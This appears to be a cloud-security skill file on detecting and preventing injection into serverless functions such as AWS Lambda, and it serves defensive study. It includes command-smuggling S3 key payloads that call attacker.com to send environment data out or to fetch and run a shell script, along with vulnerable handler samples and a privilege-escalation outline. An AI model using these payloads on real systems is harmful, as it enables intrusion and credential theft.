---
name: detecting-serverless-function-injection
description: Detects and prevents code injection attacks targeting serverless functions (AWS Lambda, Azure Functions, Google Cloud Functions) through event source poisoning, malicious layer injection, runtime command execution, and IAM privilege escalation via function modification.
subdomain: cloud-security
facing: config
mitre_attack:
- T1190
- T1059
- T1648
- T1078.004
- T1068
nist_csf:
- PR.IR-01
- ID.AM-08
- GV.SC-06
- DE.CM-01
upstream: detecting-serverless-function-injection@54a7988 Apache-2.0, modified by wesh
---
Not for: load testing or denial-of-service simulation against serverless functions, for testing against production functions processing live customer data without explicit authorization, or for modifying IAM policies in shared accounts without change management approval.

## Prerequisites

- AWS account access with read permissions for Lambda, CloudTrail, IAM, CloudWatch Logs, and EventBridge
- AWS CLI v2 configured with appropriate credentials and region
- CloudTrail enabled with Data Events for Lambda (captures `Invoke` events) and Management Events (captures `UpdateFunctionCode`, `UpdateFunctionConfiguration`, `CreateFunction`)
- Python 3.9+ with `boto3`, `bandit` (Python SAST), and `semgrep` for static analysis
- Access to function source code or deployment packages for static analysis
- CloudWatch Logs Insights access for querying Lambda execution logs

## Workflow

### Step 1: Enumerate Serverless Attack Surface

Map all Lambda functions and their event source triggers to understand injection entry points:

- **List all Lambda functions and their configurations**:
  ```bash
  aws lambda list-functions --query 'Functions[*].[FunctionName,Runtime,Role,Handler,Layers]' --output table
  ```
- **Map event source mappings**: Each event source mapping is potential injection entry point where untrusted data enters function:
  ```bash
  aws lambda list-event-source-mappings --output json | \
    jq '.EventSourceMappings[] | {Function: .FunctionArn, Source: .EventSourceArn, State: .State}'
  ```
- **Identify API Gateway triggers**: API Gateway routes pass HTTP request data (headers, query strings, body, path parameters) directly into Lambda event object:
  ```bash
  aws apigateway get-rest-apis --query 'items[*].[id,name]' --output table
  ```
  For each API, enumerate resources and methods to identify which Lambda functions receive user-controlled HTTP input.
- **Identify S3 event triggers**: S3 bucket notifications can trigger Lambda with attacker-controlled object keys and metadata:
  ```bash
  aws s3api get-bucket-notification-configuration --bucket <bucket-name>
  ```
- **Catalog function environment variables**: Secrets in environment variables are exposed if attacker achieves code execution inside function:
  ```bash
  aws lambda get-function-configuration --function-name <name> \
    --query 'Environment.Variables' --output json
  ```
- **Identify overprivileged execution roles**: Functions with `*` resource permissions or administrative policies are high-value escalation targets:
  ```bash
  aws iam list-attached-role-policies --role-name <lambda-exec-role>
  aws iam list-role-policies --role-name <lambda-exec-role>
  ```

### Step 2: Static Analysis for Injection Sinks

Scan function code for dangerous patterns that allow injected event data to execute as code or commands:

- **Download function deployment packages**:
  ```bash
  aws lambda get-function --function-name <name> --query 'Code.Location' --output text | xargs curl -o function.zip
  unzip function.zip -d function_code/
  ```
- **Python injection sinks** (Lambda Python runtimes): Search for functions that execute strings as code:
  ```python
  # DANGEROUS: Direct eval/exec of event data
  eval(event['expression'])           # Code injection via eval
  exec(event['code'])                 # Arbitrary code execution
  os.system(event['command'])         # OS command injection
  subprocess.call(event['cmd'], shell=True)  # Shell injection
  os.popen(event['input'])            # Command injection
  pickle.loads(event['data'])         # Deserialization attack
  yaml.load(event['config'])          # YAML deserialization (unsafe loader)
  ```
- **Node.js injection sinks** (Lambda Node.js runtimes):
  ```javascript
  // DANGEROUS: Direct execution of event data
  eval(event.expression);                    // Code injection
  new Function(event.code)();               // Dynamic function creation
  child_process.exec(event.command);         // OS command injection
  child_process.execSync(event.cmd);         // Synchronous command injection
  vm.runInNewContext(event.script);          // Sandbox escape potential
  require('child_process').exec(event.input); // Import-and-execute pattern
  ```
- **Run Semgrep with serverless rules**: Use purpose-built rules that detect event data flowing into injection sinks:
  ```bash
  semgrep --config "p/owasp-top-ten" --config "p/command-injection" \
    --config "p/python-security" function_code/ --json --output semgrep_results.json
  ```
- **Run Bandit for Python functions**:
  ```bash
  bandit -r function_code/ -f json -o bandit_results.json \
    -t B102,B301,B307,B602,B603,B604,B605,B606,B607
  ```
  These test IDs specifically target `exec`, `pickle`, `eval`, `subprocess` with `shell=True`, and other injection-relevant patterns.

- **Custom pattern detection**: Search for indirect injection patterns where event data is concatenated into strings that are later executed:
  ```python
  # Indirect injection: event data flows into SQL query string
  query = f"SELECT * FROM users WHERE id = '{event['userId']}'"
  cursor.execute(query)  # SQL injection
  # Indirect injection: event data flows into template rendering
  template = event['template']
  rendered = jinja2.Template(template).render()  # SSTI
  ```

### Step 3: Detect Event Source Poisoning

Analyze event sources for injection payloads that exploit how Lambda processes triggers:

- **S3 event key injection**: When Lambda function processes S3 events, object key from event record can contain injection payloads. attacker uploads object with malicious key name:
  ```python
  # Vulnerable Lambda handler
  def handler(event, context):
      bucket = event['Records'][0]['s3']['bucket']['name']
      key = event['Records'][0]['s3']['object']['key']
      # VULNERABLE: key is attacker-controlled
      os.system(f"aws s3 cp s3://{bucket}/{key} /tmp/file")
  ```
  Attack: Upload object with key `; curl http://attacker.com/exfil?data=$(env)` to inject command through S3 event.

- **SQS message body injection**: Lambda processes SQS messages where body contains attacker-controlled data:
  ```python
  # Vulnerable Lambda handler
  def handler(event, context):
      for record in event['Records']:
          message = json.loads(record['body'])
          # VULNERABLE: message content used in eval
          result = eval(message['formula'])
  ```

- **API Gateway header/parameter injection**: HTTP request data passes through API Gateway into Lambda event:
  ```python
  # Vulnerable Lambda handler
  def handler(event, context):
      user_agent = event['headers']['User-Agent']
      # VULNERABLE: header value used in shell command
      subprocess.run(f"echo {user_agent} >> /tmp/access.log", shell=True)
  ```

- **DynamoDB Stream record injection**: Modified DynamoDB items trigger Lambda with new record values. If attacker can write to table, they control event data:
  ```python
  # Vulnerable Lambda handler
  def handler(event, context):
      for record in event['Records']:
          new_image = record['dynamodb']['NewImage']
          config = new_image['config']['S']
          # VULNERABLE: DynamoDB record value used in exec
          exec(config)
  ```

- **Detection via CloudWatch Logs Insights**: Query for evidence of injection attempts in function execution logs:
  ```
  fields @timestamp, @message
  | filter @message like /(?i)(eval|exec|os\.system|child_process|subprocess|import os)/
  | filter @message like /(?i)(error|exception|traceback|syntax)/
  | sort @timestamp desc
  | limit 100
  ```

### Step 4: Detect Malicious Lambda Layer Injection

Identify unauthorized Lambda layers that intercept function execution or exfiltrate data:

- **Audit current layer attachments**: List all functions and their layer versions to identify unexpected additions:
  ```bash
  aws lambda list-functions --query 'Functions[*].[FunctionName,Layers[*].Arn]' --output json
  ```
- **Detect layer modification events in CloudTrail**: Query for `UpdateFunctionConfiguration` events that add or change layers:
  ```bash
  aws cloudtrail lookup-events \
    --lookup-attributes AttributeKey=EventName,AttributeValue=UpdateFunctionConfiguration \
    --start-time "2026-03-12T00:00:00Z" \
    --end-time "2026-03-19T23:59:59Z" \
    --query 'Events[*].[EventTime,Username,CloudTrailEvent]'
  ```
  Parse the `CloudTrailEvent` JSON to check if `Layers` was modified in request parameters.

- **Analyze layer contents**: Download and inspect layer packages for malicious code:
  ```bash
  aws lambda get-layer-version --layer-name <layer-name> --version-number <version> \
    --query 'Content.Location' --output text | xargs curl -o layer.zip
  unzip layer.zip -d layer_contents/
  # Search for suspicious patterns
  grep -rn "urllib\|requests\|http\|socket\|exfil\|base64\|subprocess" layer_contents/
  ```

- **Layer hijacking indicators**: A malicious layer can override function's runtime behavior by placing files in runtime's search path:
  - Python: Layer code in `/opt/python/` is imported before function's own modules
  - Node.js: Layer code in `/opt/nodejs/node_modules/` overrides function dependencies
  - Layer providing modified `boto3` package can intercept all AWS API calls, log credentials, and forward requests to attacker-controlled endpoint

- **CloudTrail detection query for layer changes**:
  ```json
  {
    "source": ["aws.lambda"],
    "detail-type": ["AWS API Call via CloudTrail"],
    "detail": {
      "eventName": ["UpdateFunctionConfiguration20150331v2", "PublishLayerVersion20181031"],
      "errorCode": [{"exists": false}]
    }
  }
  ```

### Step 5: Detect IAM Privilege Escalation via Lambda

Identify escalation paths where attackers modify functions to assume higher-privilege roles:

- **Lambda privilege escalation pattern**: attacker with `lambda:UpdateFunctionCode` and `iam:PassRole` permissions can:
  1. Identify Lambda function with high-privilege execution role (e.g., AdministratorAccess)
  2. Modify function's code to call `sts:GetCallerIdentity` or perform privileged actions
  3. Invoke function, which executes with high-privilege role
  4. Exfiltrate role's temporary credentials from function's environment variables (`AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN`)

- **Detect UpdateFunctionCode events**: Monitor CloudTrail for function code modifications:
  ```bash
  aws cloudtrail lookup-events \
    --lookup-attributes AttributeKey=EventName,AttributeValue=UpdateFunctionCode20150331v2 \
    --start-time "2026-03-12T00:00:00Z" \
    --query 'Events[*].[EventTime,Username,Resources[0].ResourceName]' --output table
  ```

- **Detect PassRole to Lambda**: `iam:PassRole` is required to attach different execution role to function. Monitor for this:
  ```
  # CloudWatch Logs Insights on CloudTrail logs
  fields eventTime, userIdentity.arn, requestParameters.functionName, requestParameters.role
  | filter eventName = "UpdateFunctionConfiguration20150331v2"
  | filter ispresent(requestParameters.role)
  | sort eventTime desc
  ```

- **Detect credential exfiltration from Lambda**: A compromised function may call STS or create new IAM entities:
  ```
  fields eventTime, userIdentity.arn, eventName, sourceIPAddress
  | filter userIdentity.arn like /.*:assumed-role\/.*lambda.*/
  | filter eventName in ["GetCallerIdentity", "CreateUser", "AttachUserPolicy",
      "CreateAccessKey", "AssumeRole", "PutUserPolicy"]
  | sort eventTime desc
  ```

- **EventBridge rule for real-time alerting**: Create EventBridge rule to trigger SNS alert whenever function code is modified:
  ```json
  {
    "source": ["aws.lambda"],
    "detail-type": ["AWS API Call via CloudTrail"],
    "detail": {
      "eventName": [
        "UpdateFunctionCode20150331v2",
        "UpdateFunctionConfiguration20150331v2",
        "CreateFunction20150331"
      ],
      "errorCode": [{"exists": false}]
    }
  }
  ```

### Step 6: Implement Runtime Injection Prevention

Deploy runtime protection controls to prevent injection at execution time:

- **Input validation at handler entry**: Validate and sanitize all event data before processing:
  ```python
  import re
  import json
  from functools import wraps
  SAFE_PATTERNS = {
      'userId': re.compile(r'^[a-zA-Z0-9\-]{1,64}$'),
      'email': re.compile(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'),
      'action': re.compile(r'^(get|list|create|update|delete)$'),
  }
  def validate_event(schema):
      """Decorator that validates Lambda event against a whitelist schema."""
      def decorator(func):
          @wraps(func)
          def wrapper(event, context):
              for field, pattern in schema.items():
                  value = event.get(field, '')
                  if isinstance(value, str) and not pattern.match(value):
                      return {
                          'statusCode': 400,
                          'body': json.dumps({'error': f'Invalid {field}'})
                      }
              return func(event, context)
          return wrapper
      return decorator
  @validate_event(SAFE_PATTERNS)
  def handler(event, context):
      # Event data is validated before reaching this point
      user_id = event['userId']
      # Safe to use in queries with parameterized statements
      return {'statusCode': 200, 'body': json.dumps({'user': user_id})}
  ```

- **Lambda function URL authorization**: Ensure functions exposed via URLs require IAM auth:
  ```bash
  aws lambda get-function-url-config --function-name <name> \
    --query 'AuthType' --output text
  # Must return "AWS_IAM", not "NONE"
  ```

- **Least privilege execution roles**: Restrict function's IAM role to minimum required permissions:
  ```json
  {
    "Version": "2012-10-17",
    "Statement": [
      {
        "Effect": "Allow",
        "Action": [
          "dynamodb:GetItem",
          "dynamodb:PutItem"
        ],
        "Resource": "arn:aws:dynamodb:us-east-1:111122223333:table/UserTable"
      },
      {
        "Effect": "Allow",
        "Action": "logs:*",
        "Resource": "arn:aws:logs:us-east-1:111122223333:log-group:/aws/lambda/my-function:*"
      }
    ]
  }
  ```

- **SCP to prevent dangerous Lambda modifications**: Apply Service Control Policy at organization level to restrict who can modify Lambda functions and pass roles:
  ```json
  {
    "Version": "2012-10-17",
    "Statement": [
      {
        "Sid": "DenyLambdaCodeUpdateExceptCICD",
        "Effect": "Deny",
        "Action": [
          "lambda:UpdateFunctionCode",
          "lambda:UpdateFunctionConfiguration"
        ],
        "Resource": "*",
        "Condition": {
          "StringNotLike": {
            "aws:PrincipalArn": "arn:aws:iam::*:role/CICD-DeploymentRole"
          }
        }
      }
    ]
  }
  ```

- **AWS Lambda Powertools for structured logging**: Emit structured security events that can be ingested by SIEM:
  ```python
  from aws_lambda_powertools import Logger, Tracer
  from aws_lambda_powertools.utilities.validation import validate
  logger = Logger(service="payment-processor")
  tracer = Tracer()
  @logger.inject_lambda_context
  @tracer.capture_lambda_handler
  def handler(event, context):
      logger.info("Processing event", extra={
          "source_ip": event.get('requestContext', {}).get('identity', {}).get('sourceIp'),
          "user_agent": event.get('headers', {}).get('User-Agent'),
          "http_method": event.get('httpMethod'),
      })
  ```

## Key Concepts

| Term | Definition |
|------|------------|
| **Event Source Poisoning** | attack where malicious data is injected into serverless event source (S3, SQS, DynamoDB Stream, API Gateway) to trigger code execution or injection when function processes event |
| **Function Injection** | Exploitation of unsanitized event data that flows into dangerous runtime functions (eval, exec, os.system, child_process.exec) within serverless function handler |
| **Lambda Layer Hijacking** | attack where malicious Lambda layer is attached to function to intercept execution, override dependencies, or exfiltrate data by placing code in runtime's module search path |
| **IAM Privilege Escalation via Lambda** | technique where attacker with UpdateFunctionCode and PassRole permissions modifies function to execute with higher-privilege IAM role, extracting temporary credentials |
| **OWASP Serverless Top 10** | security framework identifying ten most critical risks in serverless architectures, including injection (SAS-1), broken authentication (SAS-2), and over-privileged functions (SAS-6) |
| **Cold Start Injection** | attack that targets function initialization phase where environment variables, layer code, and extensions execute before handler, potentially in unmonitored context |
| **Execution Role** | IAM role assumed by Lambda function during execution, providing temporary credentials that define function's AWS API access permissions |

## Tools & Systems

- **Semgrep**: Static analysis tool with serverless-specific rule packs that detect event data flowing into injection sinks across Python, Node.js, Java, and Go Lambda runtimes
- **Bandit**: Python-specific SAST tool that identifies security issues including use of eval, exec, subprocess with shell=True, and pickle deserialization
- **AWS CloudTrail**: Logs Lambda management events (UpdateFunctionCode, CreateFunction) and data events (Invoke) for detecting unauthorized modifications and anomalous invocation patterns
- **CloudWatch Logs Insights**: Query engine for searching Lambda execution logs for injection attempt indicators, runtime errors, and suspicious command patterns
- **AWS Config**: Evaluates Lambda function configurations against compliance rules including layer inventory, execution role permissions, and function URL authorization types
- **Prowler**: Open-source AWS security assessment tool with Lambda-specific checks for public access, overprivileged roles, and missing encryption

## Serverless Function Injection Assessment

**Account**: 111122223333
**Region**: us-east-1
**Functions Analyzed**: 47
**Event Source Mappings**: 23
**Assessment Date**: 2026-03-19

### Critical Findings

#### FINDING-001: OS Command Injection in S3 Event Handler
**Function**: image-resize-processor
**Runtime**: python3.12
**Severity**: Critical (CVSS 9.8)
**Sink**: os.system() at handler.py:34
**Source**: event['Records'][0]['s3']['object']['key']
**Attack Vector**: Upload S3 object with key containing shell metacharacters
**Proof of Concept**:
  Object key: `; curl http://attacker.com/shell.sh | bash`
  Results in: os.system("convert /tmp/; curl http://attacker.com/shell.sh | bash")
**Remediation**: Replace os.system() with subprocess.run() with shell=False
  and validate S3 key against allowlist pattern.

#### FINDING-002: IAM Privilege Escalation Path
**Function**: data-export-worker
**Execution Role**: arn:aws:iam::111122223333:role/DataExportRole
**Role Permissions**: s3:*, dynamodb:*, iam:PassRole, lambda:*
**Risk**: Any user with lambda:UpdateFunctionCode can modify this function
  to execute arbitrary AWS API calls with AdministratorAccess-equivalent permissions.
**Remediation**: Apply least privilege to execution role, restrict
  lambda:UpdateFunctionCode via SCP to CI/CD pipeline role only.

#### FINDING-003: Unauthorized Layer Attached
**Function**: auth-token-validator
**Layer**: arn:aws:lambda:us-east-1:999888777666:layer:utility-lib:3
**Layer Account**: External account (999888777666)
**Risk**: Layer from untrusted external account can intercept all function
  invocations, modify responses, or exfiltrate environment variables.
**Remediation**: Remove external layer, vendor dependency into the
  function's deployment package, add AWS Config rule to block external layers.

### Detection Rules Deployed
- EventBridge rule: Alert on UpdateFunctionCode from non-CI/CD principals
- CloudWatch alarm: Function error rate spike > 3x baseline in 5 minutes
- Config rule: Lambda functions must not have layers from external accounts
- Config rule: Lambda execution roles must not have wildcard resource permissions
```

Not vendored (scripts/, references/): https://github.com/mukul975/Anthropic-Cybersecurity-Skills/tree/54a798831d2266a3ca61ce68a7acb80b81160d57/skills/detecting-serverless-function-injection
